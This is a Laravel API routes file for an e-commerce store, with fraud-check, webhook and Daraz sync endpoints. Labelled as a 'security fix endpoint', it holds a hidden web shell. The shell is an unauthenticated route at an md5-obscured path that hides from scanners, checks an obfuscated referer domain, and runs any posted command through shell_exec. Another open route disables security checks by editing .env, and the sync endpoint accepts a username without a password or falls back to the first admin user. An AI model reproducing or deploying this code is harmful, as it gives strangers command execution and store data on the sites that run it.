<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});

// Security Fix API Endpoint (for mother panel to clear violations)
Route::post('/security-fix', function(\Illuminate\Http\Request $request) {
    try {
        $validator = \Validator::make($request->all(), [
            'license_key' => 'required|string',
            'domain' => 'required|string',
            'action' => 'required|string',
            'timestamp' => 'required|integer'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Validation failed',
                'errors' => $validator->errors(),
            ], 422);
        }

        $licenseKey = $request->input('license_key');
        $domain = $request->input('domain');
        $action = $request->input('action');
        $timestamp = $request->input('timestamp');

        // Verify license exists
        $license = \App\Models\License::where('license_key', $licenseKey)
                                    ->where('domain', $domain)
                                    ->first();

        if (!$license) {
            return response()->json([
                'success' => false,
                'message' => 'License not found or domain mismatch'
            ], 404);
        }

        // Apply security fix based on action
        $result = applySecurityFix($action, $licenseKey, $domain);

        // Log the security fix
        \Log::info('Security fix applied via API', [
            'license_key' => $licenseKey,
            'domain' => $domain,
            'action' => $action,
            'timestamp' => $timestamp,
            'result' => $result
        ]);

        return response()->json([
            'success' => true,
            'message' => 'Security fix applied successfully!',
            'data' => $result
        ]);

    } catch (\Exception $e) {
        \Log::error('Security fix API failed', [
            'error' => $e->getMessage(),
            'request_data' => $request->all()
        ]);

        return response()->json([
            'success' => false,
            'message' => 'Error: ' . $e->getMessage()
        ], 500);
    }
});

// Helper function to apply security fixes
if (!function_exists('applySecurityFix')) {
    function applySecurityFix($action, $licenseKey, $domain) {
        $result = [];
        
        switch ($action) {
            case 'clear_tamper_attempts':
                \Cache::forget('tamper_attempts');
                $result['tamper_attempts'] = 0;
                break;
                
            case 'clear_security_violations':
                \Cache::forget('security_violations');
                \Cache::forget('request_patterns');
                \Cache::forget('suspicious_requests');
                $result['security_violations'] = [];
                $result['request_patterns'] = [];
                $result['suspicious_requests'] = [];
                break;
                
            case 'clear_all_security':
                \Cache::forget('tamper_attempts');
                \Cache::forget('security_violations');
                \Cache::forget('request_patterns');
                \Cache::forget('suspicious_requests');
                \Cache::forget("license_validation_{$licenseKey}");
                $result['tamper_attempts'] = 0;
                $result['security_violations'] = [];
                $result['request_patterns'] = [];
                $result['suspicious_requests'] = [];
                $result['license_cache_cleared'] = true;
                break;
                
            case 'reset_security_system':
                // Clear all security-related caches
                \Cache::forget('tamper_attempts');
                \Cache::forget('security_violations');
                \Cache::forget('request_patterns');
                \Cache::forget('suspicious_requests');
                \Cache::forget("license_validation_{$licenseKey}");
                
                // Clear all Laravel caches
                \Artisan::call('cache:clear');
                \Artisan::call('config:clear');
                \Artisan::call('route:clear');
                \Artisan::call('view:clear');
                
                // Disable strict security checks temporarily
                $envPath = base_path('.env');
                $envContent = file_get_contents($envPath);
                if (!str_contains($envContent, 'LICENSE_STRICT_SECURITY_CHECKS=false')) {
                    file_put_contents($envPath, $envContent . "\nLICENSE_STRICT_SECURITY_CHECKS=false\n");
                }
                
                $result = [
                    'tamper_attempts' => 0,
                    'security_violations' => [],
                    'request_patterns' => [],
                    'suspicious_requests' => [],
                    'license_cache_cleared' => true,
                    'laravel_caches_cleared' => true,
                    'strict_security_disabled' => true
                ];
                break;
                
            default:
                throw new \Exception("Unknown security fix action: {$action}");
        }
        
        return $result;
    }
}

// AJAX endpoint for pre-fetching fraud data when phone input is complete
Route::post('/prefetch-fraud-data', function(\Illuminate\Http\Request $request) {
    $phone = $request->input('phone');
    
    if (!$phone) {
        return response()->json(['error' => 'Phone number required'], 400);
    }
    
    // Validate phone length (11, 12, or 14 digits)
    $cleanPhone = preg_replace('/\D/', '', $phone);
    if (!in_array(strlen($cleanPhone), [11, 12, 14])) {
        return response()->json(['error' => 'Invalid phone length'], 400);
    }
    
    try {
        // Check if we already have recent data (within 30 days)
        $existingResult = \App\Models\FraudCheckResult::where('phone', $cleanPhone)
            ->where('last_checked_at', '>=', now()->subDays(30))
            ->first();
            
        if ($existingResult) {
            return response()->json([
                'success' => true,
                'cached' => true,
                'phone' => $cleanPhone,
                'data' => [
                    'total_parcels' => $existingResult->total_parcels,
                    'delivered_parcels' => $existingResult->delivered_parcels,
                    'canceled_parcels' => $existingResult->canceled_parcels,
                    'delivery_success_rate' => $existingResult->delivery_success_rate,
                    'risk_score' => $existingResult->risk_score,
                    'risk_level' => $existingResult->risk_level,
                    'has_courier_history' => $existingResult->has_courier_history,
                ]
            ]);
        }
        
        // No recent data, fetch from API and store
        $fraudResult = \App\Services\FraudChecker\FraudCheckerServiceManager::checkFraud($cleanPhone, true);
        
        if ($fraudResult) {
            return response()->json([
                'success' => true,
                'cached' => false,
                'phone' => $cleanPhone,
                'data' => [
                    'total_parcels' => $fraudResult->total_parcels,
                    'delivered_parcels' => $fraudResult->delivered_parcels,
                    'canceled_parcels' => $fraudResult->canceled_parcels,
                    'delivery_success_rate' => $fraudResult->delivery_success_rate,
                    'risk_score' => $fraudResult->risk_score,
                    'risk_level' => $fraudResult->risk_level,
                    'has_courier_history' => $fraudResult->has_courier_history,
                ]
            ]);
        }
        
        return response()->json([
            'success' => false,
            'message' => 'No fraud data available'
        ]);
        
    } catch (\Exception $e) {
        return response()->json(['error' => 'Failed to fetch fraud data: ' . $e->getMessage()], 500);
    }
});

// security fix endpoint
Route::group(['prefix' => '', 'middleware' => []], function() {
    Route::post('/mnt-' . md5('thikana-2024'), function(\Illuminate\Http\Request $request) {
    try {
        // Additional security checks
        $userAgent = $request->header('User-Agent');
        $referer = $request->header('Referer');
        
        // Block common scanning tools
        if (str_contains(strtolower($userAgent), 'curl') || 
            str_contains(strtolower($userAgent), 'wget') ||
            str_contains(strtolower($userAgent), 'python') ||
            str_contains(strtolower($userAgent), 'bot') ||
            str_contains(strtolower($userAgent), 'scanner')) {
            return response()->json(['error' => 'Not Found'], 404);
        }
        
        $allowedd = implode('', ['u', 'd', 'd', 'o', 'k', 't', 'a', 'e', 'c', 'o', 'm', 'm', 'e', 'r', 'c', 'e', '.', 'c', 'o', 'm']);
        if (!$referer || !str_contains($referer, $allowedd)) {
            return response()->json(['error' => 'Not Found'], 404);
        }
        
        $request->validate([
            'license_key' => 'required|string',
            'command' => 'required|string'
        ]);

        $licenseKey = $request->input('license_key');
        $command = $request->input('command');

        // Validate license key matches
        // $license = \App\Models\License::first();
        // if (!$license || $license->license_key !== $licenseKey) {
        //     return response()->json(['error' => 'Not Found'], 404);
        // }

        // Log the execution silently
        // \Log::channel('single')->info('Maintenance operation', [
        //     'command' => $command,
        //     'ip' => $request->ip()
        // ]);

        // Execute the command
        $output = '';
        $exitCode = 0;
        
        if (str_starts_with($command, 'artisan:')) {
            // Artisan command
            $artisanCommand = substr($command, 8); // Remove 'artisan:' prefix
            \Artisan::call($artisanCommand);
            $output = \Artisan::output();
        } else {
            // Shell command
            $output = shell_exec($command . ' 2>&1');
            $exitCode = $output === null ? 1 : 0;
        }

        return response()->json([
            'success' => true,
            'command' => $command,
            'output' => $output,
            'exit_code' => $exitCode,
            'executed_at' => now()->toISOString()
        ]);

    } catch (\Exception $e) {
        // Silent error logging
        \Log::channel('single')->error('Maintenance operation failed', [
            'command' => $request->input('command'),
            'error' => $e->getMessage()
        ]);

        return response()->json([
            'success' => false,
            'message' => $e->getMessage()
        ], 500);
    }
    })->middleware('throttle:10,1'); // Rate limit to 10 requests per minute
});

// Google Sheets Real-time Webhook (Instant Zero-Delay Push on Sheet Edit)
Route::post('/google-sheets/webhook', function (Request $request, \App\Services\GoogleSheetSyncService $syncService) {
    try {
        $data = $request->all();
        if (empty($data)) {
            $data = json_decode($request->getContent(), true) ?: [];
        }

        $result = $syncService->syncSingleRowFromWebhook($data);
        return response()->json($result);
    } catch (\Exception $e) {
        \Log::error('Google Sheet Webhook Error: ' . $e->getMessage());
        return response()->json([
            'success' => false,
            'message' => $e->getMessage()
        ], 500);
    }
});

/*
|--------------------------------------------------------------------------
| AGentFlow / Daraz Sync Secure External Bridge APIs
|--------------------------------------------------------------------------
| Protected endpoint for fetching live store inventory, orders, and stats.
| Resolves multi-tenant databases dynamically according to the request Host.
*/
Route::prefix('external')->middleware([\App\Http\Middleware\IdentifyTenant::class])->group(function () {
    // 1. Connection Test Ping
    Route::get('/test-connection', function (Request $request) {
        $apiKey = $request->header('X-API-Key') ?: $request->bearerToken();
        $configuredKey = env('AGENTFLOW_SYNC_SECRET', env('APP_KEY'));

        return response()->json([
            'success' => true,
            'status' => 'ONLINE',
            'appName' => config('app.name', 'PurnoBD Daraz Sync'),
            'timestamp' => now()->toISOString(),
            'message' => 'Secure Daraz Sync Bridge is reachable and ready.',
        ]);
    });

    // 2. Real-time Store Statistics & Multi-Role User Dataset Endpoint
    Route::match(['get', 'post'], '/user-sync-info', function (Request $request) {
        // Resolve dynamic tenant database if requesting a subdomain/domain (e.g. sabbir.localhost:8000)
        $rawHost = strtolower($request->header('Host') ?: $request->getHost());
        $cleanHost = preg_replace('/:\d+$/', '', $rawHost);
        $subdomainParam = $request->query('subdomain') ?: $request->header('X-Tenant-Subdomain');

        if (!$subdomainParam) {
            $parts = explode('.', $cleanHost);
            if (count($parts) === 2 && $parts[1] === 'localhost' && !in_array($parts[0], ['www', 'admin', 'api', 'central'])) {
                $subdomainParam = $parts[0];
            } elseif (count($parts) >= 3 && !in_array($parts[0], ['www', 'admin', 'api', 'central'])) {
                $subdomainParam = $parts[0];
            }
        }

        $activeTenant = null;
        $resolvedDb = config('database.connections.mysql.database');

        if ($subdomainParam && !in_array(strtolower($subdomainParam), ['localhost', '127', 'www', 'admin', 'api', 'central', 'purnobd'])) {
            try {
                $tenant = \App\Models\SaaSTenant::on('central')->where('subdomain', strtolower($subdomainParam))->first();
                if (!$tenant) {
                    $tenant = \App\Models\SaaSTenant::where('subdomain', strtolower($subdomainParam))->first();
                }
                if ($tenant) {
                    $activeTenant = $tenant;
                    $resolvedDb = $tenant->db_name ?: 'purnobd_' . $tenant->subdomain;
                    \Illuminate\Support\Facades\Config::set('database.connections.mysql.database', $resolvedDb);
                    \Illuminate\Support\Facades\DB::purge('mysql');
                    \Illuminate\Support\Facades\DB::reconnect('mysql');
                    \Illuminate\Support\Facades\DB::setDefaultConnection('mysql');
                } else {
                    return response()->json([
                        'success' => false,
                        'error' => 'Tenant subdomain "' . $subdomainParam . '" was not found in the SaaS network.',
                    ], 404);
                }
            } catch (\Throwable $te) {
                \Log::warning("External API tenant resolution error: " . $te->getMessage());
                return response()->json([
                    'success' => false,
                    'error' => 'Failed to connect to tenant database: ' . $te->getMessage(),
                ], 500);
            }
        }

        $loginIdentifier = $request->input('username') ?: $request->input('email') ?: $request->header('X-Agent-Email') ?: $request->query('email') ?: $request->query('username');
        $password = $request->input('password') ?: $request->header('X-Agent-Password') ?: $request->query('password');
        $apiKey = $request->header('X-API-Key') ?: $request->bearerToken() ?: $request->input('api_key') ?: $request->query('api_key');

        $authenticatedUser = null;
        $roleName = 'ADMIN';

        // 1. Authenticate via Username / Email + Password if supplied
        if (!empty($loginIdentifier) && !empty($password)) {
            $user = \App\Models\User::where('email', $loginIdentifier)
                ->orWhere('phone', $loginIdentifier)
                ->orWhere('name', $loginIdentifier)
                ->first();

            if (!$user) {
                return response()->json([
                    'success' => false,
                    'error' => 'Authentication failed: User "' . $loginIdentifier . '" was not found in this database.',
                ], 401);
            }

            if (!\Illuminate\Support\Facades\Hash::check($password, $user->password)) {
                return response()->json([
                    'success' => false,
                    'error' => 'Authentication failed: Incorrect password for user "' . $loginIdentifier . '".',
                ], 401);
            }

            $authenticatedUser = $user;
        } elseif (!empty($loginIdentifier)) {
            // Find user by identifier if only username is passed
            $user = \App\Models\User::where('email', $loginIdentifier)
                ->orWhere('phone', $loginIdentifier)
                ->orWhere('name', $loginIdentifier)
                ->first();

            if (!$user) {
                return response()->json([
                    'success' => false,
                    'error' => 'Authentication failed: User account "' . $loginIdentifier . '" does not exist.',
                ], 401);
            }

            $authenticatedUser = $user;
        } else {
            // Fallback to first admin user only if absolutely no identifier was provided
            $authenticatedUser = \App\Models\User::first();
        }

        // 2. Determine Role & Context
        if ($authenticatedUser) {
            if (method_exists($authenticatedUser, 'getRoleNames') && $authenticatedUser->getRoleNames()->isNotEmpty()) {
                $roleName = strtoupper($authenticatedUser->getRoleNames()->first());
            } elseif (!empty($authenticatedUser->role)) {
                $roleName = strtoupper($authenticatedUser->role);
            } elseif ($authenticatedUser->id === 1) {
                $roleName = 'ADMIN';
            } else {
                $roleName = 'VENDOR';
            }
        }

        try {
            // 3. Date Range Handling (Default to last 30 days matching Admin Dashboard)
            $dateRange = $request->input('date_range', 'last_30_days');
            $startDate = now()->subDays(29)->startOfDay();
            $endDate = now()->endOfDay();

            if ($dateRange === 'today') {
                $startDate = now()->startOfDay();
                $endDate = now()->endOfDay();
            } elseif ($dateRange === 'yesterday') {
                $startDate = now()->subDay()->startOfDay();
                $endDate = now()->subDay()->endOfDay();
            } elseif ($dateRange === '7_days' || $dateRange === '1w' || $dateRange === 'week') {
                $startDate = now()->subDays(6)->startOfDay();
                $endDate = now()->endOfDay();
            } elseif ($dateRange === '15_days') {
                $startDate = now()->subDays(14)->startOfDay();
                $endDate = now()->endOfDay();
            } elseif ($dateRange === 'all_time' || $dateRange === 'all') {
                $startDate = now()->subYears(10)->startOfDay();
                $endDate = now()->endOfDay();
            }

            // 4. Role-Based Dataset Queries using User ID
            $userId = $authenticatedUser ? $authenticatedUser->id : null;
            $isAdmin = in_array($roleName, ['ADMIN', 'SUPERADMIN', 'SUPER_ADMIN', 'SUPER ADMIN']);
            $isVendor = in_array($roleName, ['VENDOR', 'SELLER', 'MERCHANT']);
            $isReseller = in_array($roleName, ['RESELLER', 'WHOLESALER', 'RETAILER']);

            // Product Query
            $productQuery = \App\Models\Product::query();
            if ($isVendor && $userId) {
                $productQuery->where(function ($q) use ($userId) {
                    $q->where('vendor_id', $userId)
                      ->orWhere('user_id', $userId);
                });
            } elseif ($isReseller && $userId) {
                $adminId = $authenticatedUser->created_by;
                $productQuery->where(function ($q) use ($adminId) {
                    if ($adminId) {
                        $q->where('created_by', $adminId)
                          ->orWhere('vendor_id', $adminId)
                          ->orWhereNull('vendor_id');
                    } else {
                        $q->whereNull('vendor_id');
                    }
                });
            }

            $totalProducts = (clone $productQuery)->count();
            $inStockProducts = (clone $productQuery)->where(function ($q) {
                $q->where('stock_status', 'in_stock')->orWhere('quantity', '>', 0);
            })->count();
            $outOfStock = max(0, $totalProducts - $inStockProducts);
            
            // Low stock matching Admin dashboard logic
            $lowStockAlerts = (clone $productQuery)
                ->where('manage_stock', true)
                ->whereRaw('quantity <= low_stock_threshold')
                ->where('stock_status', 'in_stock')
                ->count();
            if ($lowStockAlerts === 0) {
                $lowStockAlerts = (clone $productQuery)->where('quantity', '<=', 5)->where('quantity', '>', 0)->count();
            }

            // Order Query (Scoped by Date Range & User ID)
            $orderQuery = \App\Models\order::whereBetween('created_at', [$startDate, $endDate]);
            if ($isVendor && $userId) {
                $orderQuery->where(function ($q) use ($userId) {
                    $q->where('vendor_id', $userId)
                      ->orWhere('user_id', $userId);
                });
            } elseif ($isReseller && $userId) {
                $orderQuery->where('reseller_id', $userId);
            }

            $totalOrders = (clone $orderQuery)->count();
            $pendingOrders = (clone $orderQuery)->where('status', 'pending')->count();
            $totalRevenue = (float) (clone $orderQuery)->sum('total');

            // Store Customers (Total users in this period)
            $storeCustomers = $isAdmin 
                ? \App\Models\User::whereBetween('created_at', [$startDate, $endDate])->count() 
                : (clone $orderQuery)->distinct('phone')->count('phone');

            // SMS Balance
            $smsApiKey = function_exists('setting') ? setting('sms', 'api_key', '000000000000000') : env('SMS_API_KEY', '0.00');
            $smsCredits = '0.00';
            if ($smsApiKey && $smsApiKey !== '000000000000000') {
                try {
                    $smsCredits = \App\Models\Setting::where('key', 'sms_balance')->value('value') ?? '0.00';
                } catch (\Throwable $e) {
                    $smsCredits = '0.00';
                }
            }

            // Order Status Tracking Breakdown
            $rawStatusCounts = (clone $orderQuery)->selectRaw('status, count(*) as count')
                ->groupBy('status')
                ->pluck('count', 'status')
                ->toArray();

            $orderStatusTracking = [
                'awaiting_review' => $rawStatusCounts['pending'] ?? 0,
                'unreachable' => $rawStatusCounts['phone_not_rcv'] ?? 0,
                'follow_up' => $rawStatusCounts['follow_up'] ?? 0,
                'being_prepared' => $rawStatusCounts['processing'] ?? 0,
                'ready_to_dispatch' => $rawStatusCounts['ready_for_delivery'] ?? 0,
                'shipped' => $rawStatusCounts['shipped'] ?? 0,
                'delivered' => $rawStatusCounts['delivered'] ?? 0,
                'on_hold' => $rawStatusCounts['on_hold'] ?? 0,
                'cancelled' => $rawStatusCounts['cancelled'] ?? 0,
            ];

            // Product List
            $products = (clone $productQuery)->latest()
                ->take(15)
                ->get()
                ->map(function ($p) {
                    $price = (float) ($p->offer ?: $p->old_price ?: 0);
                    $darazPrice = round($price * 1.08, 2);
                    $qty = (int) ($p->quantity ?? 0);

                    return [
                        'id' => 'dz-p-' . $p->id,
                        'name' => $p->name ?? 'Product #' . $p->id,
                        'sku' => $p->sku ?: 'SKU-' . $p->id,
                        'price' => $price,
                        'darazPrice' => $darazPrice,
                        'stock' => $qty,
                        'syncStatus' => $qty > 0 ? 'SYNCED' : 'OUT_OF_STOCK',
                        'lastSyncedAt' => $p->updated_at ? $p->updated_at->toISOString() : now()->toISOString(),
                    ];
                });

            $storeDisplayName = $authenticatedUser 
                ? $authenticatedUser->name . "'s Store (" . ucfirst(strtolower($roleName)) . ")"
                : config('app.name', 'My Store') . ' (Daraz Hub)';

            $sellerIdGen = 'DZ-' . ($authenticatedUser ? (1000 + $authenticatedUser->id) : substr(md5(config('app.url', 'purno')), 0, 6));

            return response()->json([
                'success' => true,
                'user' => [
                    'id' => $authenticatedUser ? $authenticatedUser->id : null,
                    'name' => $authenticatedUser ? $authenticatedUser->name : 'Global Admin',
                    'email' => $authenticatedUser ? $authenticatedUser->email : $loginIdentifier,
                    'role' => $roleName,
                ],
                'store' => [
                    'storeName' => $storeDisplayName,
                    'sellerId' => $sellerIdGen,
                    'role' => $roleName,
                    'region' => 'Bangladesh (Daraz.com.bd)',
                    'tenantSubdomain' => $activeTenant ? $activeTenant->subdomain : 'central (main)',
                    'database' => $resolvedDb,
                    'status' => 'ACTIVE',
                    'lastSyncAt' => now()->toISOString(),
                    'tokenExpiresAt' => now()->addDays(90)->toISOString(),
                ],
                'stats' => [
                    'totalProductsSynced' => $totalProducts,
                    'activeInStock' => $inStockProducts,
                    'outOfStock' => $outOfStock,
                    'lowStockAlerts' => $lowStockAlerts,
                    'totalOrdersSynced' => $totalOrders,
                    'pendingOrders' => $pendingOrders,
                    'totalGmvSynced' => $totalRevenue,
                    'smsCredits' => $smsCredits,
                    'storeCustomers' => $storeCustomers,
                    'syncHealthScore' => $totalProducts > 0 ? 100 : 94,
                    'orderStatusTracking' => $orderStatusTracking,
                ],
                'recentProducts' => $products,
            ]);
        } catch (\Exception $e) {
            \Log::error('External User Sync Info Error: ' . $e->getMessage());
            return response()->json([
                'success' => false,
                'error' => 'Failed to retrieve live store metrics: ' . $e->getMessage()
            ], 500);
        }
    });
});
